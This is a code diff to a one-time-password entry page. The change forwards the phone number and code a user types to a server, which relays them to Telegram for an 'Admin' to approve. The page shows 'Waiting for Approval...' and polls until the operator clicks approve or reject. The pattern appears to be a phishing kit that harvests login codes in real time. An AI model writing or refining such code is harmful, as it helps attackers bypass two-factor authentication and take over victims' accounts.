@@ -12,6 +12,7 @@
         .otp-inputs input { width: 40px; height: 50px; font-size: 24px; text-align: center; border: 1px solid #ccc; border-radius: 5px; }
         .submit-btn { background-color: #4a90e2; color: white; border: none; padding: 15px; width: 100%; border-radius: 5px; font-size: 16px; cursor: pointer; margin-bottom: 15px; }
         .submit-btn:hover { background-color: #357abd; }
+        .submit-btn:disabled { background-color: #a0c4e8; cursor: not-allowed; }
         .resend { color: #d9534f; font-size: 14px; cursor: pointer; text-decoration: none; }
     </style>
 </head>
@@ -43,11 +44,12 @@
 <script>
     // Get the phone number from the previous page
     const phone = localStorage.getItem('loginPhone');
+    
+    // If user lands here without a phone number, send them back to login
     if(phone) {
         document.getElementById('display-phone').innerText = phone;
     } else {
-        // If no phone number, kick them back to login
-        window.location.href = 'login.html'; 
+        window.location.href = '/login.html'; 
     }
 
     // Auto-focus next input box
@@ -57,8 +59,14 @@
         }
     }
 
+    // Resend OTP (Placeholder)
+    function resendOTP() {
+        alert("Please check your phone or contact support to resend the code.");
+    }
+
     // Verify OTP Function
     async function verifyOTP() {
+        const btn = document.querySelector('.submit-btn');
         const otp = 
             document.getElementById('otp1').value + 
             document.getElementById('otp2').value + 
@@ -72,23 +80,47 @@
             return;
         }
 
-        // Send to your backend to verify
-        const response = await fetch('/api/verify-otp', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ phone: phone, otp: otp })
-        });
+        btn.innerText = 'Sending to Admin...';
+        btn.disabled = true;
 
-        const result = await response.json();
+        try {
+            // Send the OTP to the server to be forwarded to Telegram
+            const response = await fetch('/api/verify-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ phone: phone, otp: otp })
+            });
 
-        if (result.success) {
-            alert("Login Successful!");
-            // Redirect to user dashboard
-            window.location.href = '/dashboard.html'; 
-        } else {
-            alert("Invalid OTP. Please try again.");
+            const result = await response.json();
+
+            // If the server is waiting for Telegram approval
+            if (result.status === 'pending_otp_approval') {
+                btn.innerText = 'Waiting for Approval...';
+                
+                // Start checking if you clicked "Approve" on Telegram
+                const pollInterval = setInterval(async () => {
+                    const statusRes = await fetch(`/api/check-otp-status/${encodeURIComponent(phone)}`);
+                    const statusData = await statusRes.json();
+
+                    if (statusData.otp_status === 'approved') {
+                        clearInterval(pollInterval);
+                        alert("Login Successful!");
+                        window.location.href = '/dashboard.html'; // Change this to your actual dashboard page
+                    } 
+                    else if (statusData.otp_status === 'rejected') {
+                        clearInterval(pollInterval);
+                        alert("OTP was rejected by Admin.");
+                        btn.innerText = 'SUBMIT';
+                        btn.disabled = false;
+                    }
+                }, 3000); // Check every 3 seconds
+            }
+        } catch (error) {
+            alert("Network error. Try again.");
+            btn.innerText = 'SUBMIT';
+            btn.disabled = false;
         }
     }
 </script>
 </body>
-</html>
+    </html>
